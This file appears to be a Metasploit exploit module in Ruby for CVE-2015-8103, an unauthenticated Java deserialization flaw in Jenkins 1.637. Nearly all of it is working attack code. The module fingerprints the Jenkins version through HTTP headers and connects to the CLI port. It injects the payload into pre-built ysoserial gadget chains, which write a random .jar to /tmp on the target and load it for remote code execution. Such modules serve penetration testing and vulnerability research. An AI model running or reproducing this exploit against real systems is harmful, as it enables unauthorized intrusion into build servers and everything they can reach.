##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Jenkins CLI RMI Java Deserialization Vulnerability',
      'Description'    => %q{
        This module exploits a vulnerability in Jenkins. An unsafe deserialization bug exists on
        the Jenkins master, which allows remote arbitrary code execution. Authentication is not
        required to exploit this vulnerability.
      },
      'Author'         =>
          [
            'Christopher Frohoff', # Vulnerability discovery
            'Steve Breen',         # Public Exploit
            'Dev Mohanty',         # Metasploit module
            'Louis Sato',          # Metasploit
            'William Vu',          # Metasploit
            'juan vazquez',        # Metasploit
            'Wei Chen'             # Metasploit
          ],
      'License'        => MSF_LICENSE,
      'References'     =>
          [
            ['CVE', '2015-8103'],
            ['URL', 'https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py'],
            ['URL', 'https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java'],
            ['URL', 'http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability'],
            ['URL', 'https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2015-11-11']
          ],
      'Platform'       => 'java',
      'Arch'           => ARCH_JAVA,
      'Targets'        =>
        [
          [ 'Jenkins 1.637', {} ]
        ],
      'DisclosureDate' => 'Nov 18 2015',
      'DefaultTarget' => 0))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to Jenkins in order to find X-Jenkins-CLI-Port', '/']),
      OptString.new('TEMP', [true, 'Folder to write the payload to', '/tmp']),
      Opt::RPORT('8080')
    ], self.class)
  end

  def exploit
    unless vulnerable?
      fail_with(Failure::Unknown, "#{peer} - Jenkins is not vulnerable, aborting...")
    end
    invoke_remote_method(set_payload)
    invoke_remote_method(class_load_payload)
  end


  # This is from the HttpClient mixin. But since this module isn't actually exploiting
  # HTTP, the mixin isn't used in order to favor the Tcp mixin (to avoid datastore confusion &
  # conflicts). We do need #target_uri and normlaize_uri to properly normalize the path though.

  def target_uri
    begin
      # In case TARGETURI is empty, at least we default to '/'
      u = datastore['TARGETURI']
      u = "/" if u.nil? or u.empty?
      URI(u)
    rescue ::URI::InvalidURIError
      print_error "Invalid URI: #{datastore['TARGETURI'].inspect}"
      raise Msf::OptionValidateError.new(['TARGETURI'])
    end
  end

  def normalize_uri(*strs)
    new_str = strs * "/"

    new_str = new_str.gsub!("//", "/") while new_str.index("//")

    # Makes sure there's a starting slash
    unless new_str[0,1] == '/'
      new_str = '/' + new_str
    end

    new_str
  end

  def check
    result = Exploit::CheckCode::Safe

    begin
      if vulnerable?
        result = Exploit::CheckCode::Vulnerable
      end
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      return Exploit::CheckCode::Unknown
    end

    result
  end

  def vulnerable?
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path)
    })

    unless res
      fail_with(Failure::Unknown, 'The connection timed out.')
    end

    http_headers = res.headers

    unless http_headers['X-Jenkins-CLI-Port']
      vprint_error('The server does not have the CLI port that is needed for exploitation.')
      return false
    end

    if http_headers['X-Jenkins'] && http_headers['X-Jenkins'].to_f <= 1.637
      @jenkins_cli_port = http_headers['X-Jenkins-CLI-Port'].to_i
      return true
    end

    false
  end

  # Connects to the server, creates a request, sends the request,
  # reads the response
  #
  # Passes +opts+ through directly to Rex::Proto::Http::Client#request_cgi.
  #
  def send_request_cgi(opts={}, timeout = 20)
    if datastore['HttpClientTimeout'] && datastore['HttpClientTimeout'] > 0
      actual_timeout = datastore['HttpClientTimeout']
    else
      actual_timeout =  opts[:timeout] || timeout
    end

    begin
      c = Rex::Proto::Http::Client.new(datastore['RHOST'], datastore['RPORT'])
      c.connect
      r = c.request_cgi(opts)
      c.send_recv(r, actual_timeout)
    rescue ::Errno::EPIPE, ::Timeout::Error
      nil
    end
  end

  def invoke_remote_method(serialized_java_stream)
    begin
      socket = connect(true, {'RPORT' => @jenkins_cli_port})

      print_status 'Sending headers...'
      socket.put(read_bin_file('serialized_jenkins_header'))

      vprint_status(socket.recv(1024))
      vprint_status(socket.recv(1024))

      encoded_payload0 = read_bin_file('serialized_payload_header')
      encoded_payload1 = Rex::Text.encode_base64(serialized_java_stream)
      encoded_payload2 = read_bin_file('serialized_payload_footer')

      encoded_payload = "#{encoded_payload0}#{encoded_payload1}#{encoded_payload2}"
      print_status "Sending payload length: #{encoded_payload.length}"
      socket.put(encoded_payload)
    ensure
      disconnect(socket)
    end

  end

  def print_status(msg='')
    super("#{rhost}:#{rport} - #{msg}")
  end

  #
  # Serialized stream generated with:
  # https://github.com/dmohanty-r7/ysoserial/blob/stager-payloads/src/main/java/ysoserial/payloads/CommonsCollections3.java
  #
  def set_payload
    stream = Rex::Java::Serialization::Model::Stream.new

    handle = File.new(File.join( Msf::Config.data_directory, "exploits", "CVE-2015-8103", 'serialized_file_writer' ), 'rb')
    decoded = stream.decode(handle)
    handle.close

    inject_payload_into_stream(decoded).encode
  end

  #
  # Serialized stream generated with:
  # https://github.com/dmohanty-r7/ysoserial/blob/stager-payloads/src/main/java/ysoserial/payloads/ClassLoaderInvoker.java
  #
  def class_load_payload
    stream = Rex::Java::Serialization::Model::Stream.new
    handle = File.new(File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-8103', 'serialized_class_loader' ), 'rb')
    decoded = stream.decode(handle)
    handle.close
    inject_class_loader_into_stream(decoded).encode
  end

  def inject_class_loader_into_stream(decoded)
    file_name_utf8 = get_array_chain(decoded)
                         .values[2]
                         .class_data[0]
                         .values[1]
                         .values[0]
                         .values[0]
                         .class_data[3]
    file_name_utf8.contents = get_random_file_name
    file_name_utf8.length = file_name_utf8.contents.length
    class_name_utf8 = get_array_chain(decoded)
                          .values[4]
                          .class_data[0]
                          .values[0]
    class_name_utf8.contents = 'metasploit.Payload'
    class_name_utf8.length = class_name_utf8.contents.length
    decoded
  end

  def get_random_file_name
    @random_file_name ||= "#{Rex::FileUtils.normalize_unix_path(datastore['TEMP'], "#{rand_text_alpha(4 + rand(4))}.jar")}"
  end

  def inject_payload_into_stream(decoded)
    byte_array = get_array_chain(decoded)
                     .values[2]
                     .class_data
                     .last
    byte_array.values = payload.encoded.bytes
    file_name_utf8 = decoded.references[44].class_data[0]
    rnd_fname = get_random_file_name
    register_file_for_cleanup(rnd_fname)
    file_name_utf8.contents = rnd_fname
    file_name_utf8.length = file_name_utf8.contents.length
    decoded
  end

  def get_array_chain(decoded)
    object = decoded.contents[0]
    lazy_map = object.class_data[1].class_data[0]
    chained_transformer = lazy_map.class_data[0]
    chained_transformer.class_data[0]
  end

  def read_bin_file(bin_file_path)
    data = ''

    File.open(File.join( Msf::Config.data_directory, "exploits", "CVE-2015-8103", bin_file_path ), 'rb') do |f|
      data = f.read
    end

    data
  end

end